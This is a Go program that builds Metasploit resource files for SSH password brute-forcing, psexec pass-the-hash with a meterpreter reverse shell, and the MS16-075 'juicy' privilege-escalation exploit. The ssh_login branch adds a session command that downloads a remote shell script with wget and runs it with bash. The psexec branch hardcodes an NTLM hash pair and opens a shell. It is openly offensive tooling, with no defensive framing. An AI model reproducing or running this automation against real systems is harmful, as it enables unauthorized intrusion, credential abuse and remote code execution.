package main
  
import ( 
   "fmt"
   "log" 
   "os" 
) 
  
// main function
func main() {
    // take in input from the user for the module they would like to use


    fmt.Println("The following modules are available for use: scanner/ssh/ssh_login, exploit/windows/smb/psexec, and exploit/windows/local/ms16_075_reflection_juicy")
    fmt.Println("Please choose one module: ssh_login, psexec, or juicy")
    var module string
    fmt.Scanf("%s", &module)
 
    // send the user to the correct function based off the module
    if module == "ssh_login"{
        ssh_login()
    } else if module == "psexec"{
        psexec()
    } else if module == "juicy"{
        juicy()
    } else {
        fmt.Println("You entered an invalid module. Exiting.")
        os.Exit(1)
    }
}



// ssh_login function
func ssh_login() {
    
    // the following code will create an empty resource file for us to write to later
    newFile, err := os.Create("sshLogin.rc")
    if err != nil {
       log.Fatal(err)
    }
    log.Println(newFile)
    newFile.Close()
 
    // this portion of the code will get input from the user to write into the file later. 
    fmt.Println("You are using the scanner/ssh/ssh_login module.")
 
    // RHOST
    fmt.Println("RHOST: ")
    var rhost string
    fmt.Scanf("%s", &rhost)
 
    // USERNAME
    fmt.Println("USERNAME: ")
    var username string
    fmt.Scanf("%s", &username)
 
    // USERPASS_FILE
    fmt.Println("USERPASS_FILE: (The default is: /opt/metasploit-framework/embedded/framework/data/wordlists/root_userpass.txt)")
     var userpassFile string
     fmt.Scanf("%s", &userpassFile)
    
    //opening the file and appending to it
    f, err := os.OpenFile("sshLogin.rc", os.O_APPEND | os.O_WRONLY, 0644)
 
    if err != nil {
        fmt.Println(err)
        return
    }
    firstLine := "use scanner/ssh/ssh_login"
    secondLine:= "set RHOST " + rhost
    thirdLine := "set USERNAME " + username
    fourthLine := "set USERPASS_FILE " + userpassFile
    fifthLine := "exploit -j"
    sixthLine := "sessions -c ‘cd /usr/local/bin/ wget http://" + rhost + "/zget.sh -O cron bash -x cron'"
    
    //not sure if I can do this, but once I have access to the machine again I’ll test it out    
    _, err = fmt.Fprintln(f, firstLine)
    _, err = fmt.Fprintln(f, secondLine)
    _, err = fmt.Fprintln(f, thirdLine)
    _, err = fmt.Fprintln(f, fourthLine)
    _, err = fmt.Fprintln(f, fifthLine)
    _, err = fmt.Fprintln(f, sixthLine)
 
    if err != nil {
        fmt.Println(err)
            f.Close()
        return    
    }
    err = f.Close()
    if err != nil {
        fmt.Println(err)
        return
    }
 
    fmt.Println("File appended successfully.")
 
}
 
func psexec() {
    // the following code will create an empty resource file for us to write to later
    newFile, err:= os.Create("psexec.rc")
    if err != nil {
       log.Fatal(err)
    }
    log.Println(newFile)
    newFile.Close()
    fmt.Println("You are using the exploit/windows/smb/psexec module.")
 
    payload := "windows/meterpreter/reverse_tcp"
 
    // LHOST
    fmt.Println("LHOST: ")
    var lhost string
    fmt.Scanf("%s", &lhost)
 
    // LPORT
    fmt.Println("LPORT: ")
    var lport string
    fmt.Scanf("%s", &lport)
 
    // RHOST
    fmt.Println("RHOST: ")
    var rhost string
    fmt.Scanf("%s", &rhost)
    
    //opening the file and appending to it
    f, err := os.OpenFile("psexec.rc", os.O_APPEND | os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println(err)
        return
    }
    firstLine := "use exploit/windows/smb/psexec"
    secondLine:= "set payload " + payload
    thirdLine := "set LHOST " + lhost
    fourthLine := "set LPORT " + lport
    fifthLine := "set RHOST " + rhost
    sixthLine := "set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c"
    seventhLine := "shell"
    
// not sure if I can do this, but once I have access to the machine again I’ll test it out    
    _, err = fmt.Fprintln(f, firstLine)
    _, err = fmt.Fprintln(f, secondLine)
    _, err = fmt.Fprintln(f, thirdLine)
    _, err = fmt.Fprintln(f, fourthLine)
    _, err = fmt.Fprintln(f, fifthLine)
    _, err = fmt.Fprintln(f, sixthLine)
    _, err = fmt.Fprintln(f, seventhLine)
 
    if err != nil {
        fmt.Println(err)
            f.Close()
        return    
    }
    err = f.Close()
    if err != nil {
        fmt.Println(err)
        return
    }
 
    fmt.Println("File appended successfully.")
}
 
func juicy() {
    
    // the following code will create an empty resource file for us to write to later
    newFile, err:= os.Create("juicy.rc")
    if err != nil {
       log.Fatal(err)
    }
    log.Println(newFile)
    newFile.Close()
 
    // this portion of the code will get input from the user to write into the file later. 
    fmt.Println("You are using the exploit/windows/local/ms16_075_reflection_juicy module.")
 
    // LPORT
    fmt.Println("LPORT: ")
    var lport string
    fmt.Scanf("%s", &lport)
 
    // SESSION
    fmt.Println("SESSION: ")
    var session string
    fmt.Scanf("%s", &session)

    //opening the file and appending to it
    f, err := os.OpenFile("juicy.rc", os.O_APPEND | os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println(err)
        return
    }
    firstLine := "use exploit/windows/local/ms16_075_reflection_juicy"
    secondLine:= "set LPORT " + lport
    thirdLine := "set SESSION " + session
    fourthLine := "exploit -j"
 
    
// not sure if I can do this, but once I have access to the machine again I’ll test it out    
    _, err = fmt.Fprintln(f, firstLine)
    _, err = fmt.Fprintln(f, secondLine)
    _, err = fmt.Fprintln(f, thirdLine)
    _, err = fmt.Fprintln(f, fourthLine)
 
 
    if err != nil {
        fmt.Println(err)
            f.Close()
        return    
    }
    err = f.Close()
    if err != nil {
        fmt.Println(err)
        return
    }
 
    fmt.Println("File appended successfully.")
 
}
 

 














